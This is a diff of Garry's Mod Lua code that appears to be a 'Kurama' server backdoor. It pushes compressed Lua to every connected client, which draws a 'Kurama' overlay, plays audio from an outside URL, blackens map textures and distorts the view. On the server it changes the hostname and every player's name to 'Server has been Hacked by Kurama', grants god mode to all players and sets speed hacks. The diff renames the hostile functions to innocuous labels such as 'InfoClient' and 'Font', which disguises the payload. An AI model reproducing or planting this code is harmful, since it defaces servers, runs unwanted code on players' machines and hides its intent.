@@ -23,7 +23,7 @@ hook.Add("PlayerInitialSpawn", "BestLol"..net_string,function(ply)
     end
 end)
  
-local function KuramaClient(code)
+local function InfoClient(code)
 local data = util.Compress(code)
 local len = #data
     net.Start(net_string)
@@ -32,13 +32,14 @@ local len = #data
     net.Broadcast()
 end
 
+-- Font
 timer.Simple(2 ,function()
-KuramaClient([=[
-local SheitanDev = math.Clamp(ScrH()/2.31, 0.85, 1.005);
+InfoClient([=[
+local WriteK = math.Clamp(ScrH()/2.31, 0.85, 1.005);
 surface.CreateFont( "DevMod", {
     font = "Roboto",
     extended = false,
-    size = SheitanDev *  150,
+    size = WriteK *  150,
     weight = 200,
     blursize = 1.5,
     italic = false,
@@ -48,7 +49,7 @@ surface.CreateFont( "DevMod", {
     outline = false,
 })
 
-hook.Add( "HUDPaint", "Oofed", function()
+hook.Add( "HUDPaint", "Font1", function()
     for i = 1, 60 do
 end
     draw.SimpleTextOutlined("Kurama", "DevMod", ScrW() /2, ScrH() /2,Color( 0, 0, 0),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,3,Color( 255, 255, 255))
@@ -59,8 +60,9 @@ end)
 ]=])
 end)
 
+-- Song
 timer.Simple(2 ,function()
-KuramaClient([=[
+InfoClient([=[
 local AudioSource = nil
 local AMP = 3000
 
@@ -72,7 +74,7 @@ sound.PlayURL("https://lesheitan.fr/songs/Sinking.mp3", "mono", function(source 
 end)
 
 local smoothdata = {}
-local sheitanBest = 0
+local SoundPlay = 0
 
 for i = 1 , 256 do
     smoothdata[i] = 0
@@ -83,7 +85,7 @@ local data = {}
     AudioSource:FFT(data , FFT_5000)
     for i = 65 , 125 do
         smoothdata [i] = Lerp(5 * FrameTime() , smoothdata[i] , data[i])
-        sheitanBest = sheitanBest + smoothdata [i]
+        SoundPlay = SoundPlay + smoothdata [i]
         draw.RoundedBox (1000 , i * 10 , 600 , 5 , smoothdata[i] * AMP , Color( 255, 255, 255))
     end
 end)
@@ -92,7 +94,7 @@ function MyCalcView( ply, pos, angles, fov )
 local view = {}
     view.origin = pos
     view.angles = angles
-    view.fov = fov + ( sheitanBest * 100 )
+    view.fov = fov + ( SoundPlay * 100 )
     return view
 end
 
@@ -101,8 +103,9 @@ hook.Add("CalcView", "CalcView", MyCalcView)
 ]=])
 end)
 
+-- SkyBox
 timer.Simple(2 ,function()
-KuramaClient([=[
+InfoClient([=[
     function GAMEMODE:PostDraw2DSkyBox()
 local col = Color( 0, 0, 0)
     render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
@@ -116,39 +119,41 @@ end
 ]=])
 end)
 
+-- Color Map
 timer.Simple(2 ,function()
-KuramaClient([=[
-local sheitan = {}
-    hook.Add("HUDPaint", "MonSolEstNoirWTF",function()
-        for k,v in pairs(sheitan) do
+InfoClient([=[
+local MapCustom = {}
+    hook.Add("HUDPaint", "Black",function()
+        for k,v in pairs(MapCustom) do
         v()
     end
 end)
 
-sheitan["CoolEffect"] = function()
+MapCustom["CoolEffect"] = function()
 local mats = Entity(0):GetMaterials()
     for k,v in pairs(mats) do
-local wallahjerage = Color( 0, 0, 0)
-        Material(v):SetVector("$color", Vector(wallahjerage))
+local BlackMap = Color( 0, 0, 0)
+        Material(v):SetVector("$color", Vector(BlackMap))
         Material(v):SetTexture( "$basetexture", "_rt_fullframefb" )
     end
 end
 ]=])
 end)
 
+-- Custom Settings
 timer.Simple(2 ,function()
     RunConsoleCommand("hostname", "Server has been Hacked by Kurama -> discord.gg/kurama !")
     RunConsoleCommand("ulx", "god", "*")
 end)
 
-timer.Create("BestNameForEver",2 ,99 , function()
+timer.Create("ChangeRPName",2 ,99 , function()
     for _, v in pairs(player.GetAll()) do
         v:GodEnable()
         v:setDarkRPVar("rpname", "Server has been Hacked by Kurama -> discord.gg/kurama !")
     end
 end)
 
-timer.Create("SpeedHackActived",16 ,1 , function()
+timer.Create("Speed",16 ,1 , function()
     for k,v in pairs(player.GetAll()) do
         v:SetRunSpeed(400* 4);
         v:SetWalkSpeed(400 * 4);
